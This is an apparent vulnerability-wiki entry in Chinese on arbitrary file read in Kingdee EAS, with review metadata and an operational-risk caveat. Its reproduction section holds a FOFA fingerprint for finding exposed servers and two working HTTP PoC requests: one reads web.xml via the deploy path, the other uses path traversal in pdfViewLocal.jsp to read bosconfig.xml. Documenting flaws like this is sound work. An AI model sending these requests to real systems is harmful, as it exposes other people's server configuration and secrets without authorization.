---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "金蝶EAS deploy静态文件暴露及pdfViewLocal路径读取"
product: "金蝶EAS"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "两个模块及不同部署路径；版本未知"
prerequisites: "无Cookie示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%87%91%E8%9D%B6EAS%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/%E9%87%91%E8%9D%B6EAS%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
fofa: "header=\"Apusic\" || body=\"eassso\" || header=\"EASSESSIONID\""
fofa_unverified: "header="
id: "vw-6c3a4e11cbd70d09ed07d308"
entity_id: "ve-6c3a4e11cbd70d09ed07d308"
schema_version: "1"
---

# 金蝶EAS deploy静态文件暴露及pdfViewLocal路径读取

## 条目说明

- 对象与具体问题：金蝶EAS；deploy静态文件暴露及pdfViewLocal路径读取
- 版本、配置及部署条件：两个模块及不同部署路径；版本未知
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 修复建议写金和官方明显厂商串稿，应改金蝶并补公告
- deploy直接静态路径与pdfViewLocal path穿越两类入口分别建实体，不能因为文件读取强合一
- 影响范围只产品名，FOFA残缺，文本响应/读取范围/修复版本缺

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

金蝶 EAS 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS  在 pdfViewLocal和easWebClient/deploy 存在任意文件读取漏洞，攻击者可以读取敏感文件，从而可能导致服务器受到攻击并被控制。

## 影响范围

金蝶OA EAS系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：header="Apusic" || body="eassso" || header="EASSESSIONID"

POC/EXP：

```http
GET /easWebClient/deploy/client/ctrlhome/webapps/extweb/WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1:8080
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20240105141850825](./.resource/金蝶EAS系统接口任意文件读取/media/image-20240105141850825.png)


POC/EXP：

```http
GET /easweb/cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml HTTP/1.1
Host: 127.0.0.1:6888
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20240105141948781](./.resource/金蝶EAS系统接口任意文件读取/media/image-20240105141948781.png)


## 修复方案

**官方修复：**关注金蝶官方安全公告和适用补丁；本材料没有提供可核实的修复版本。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
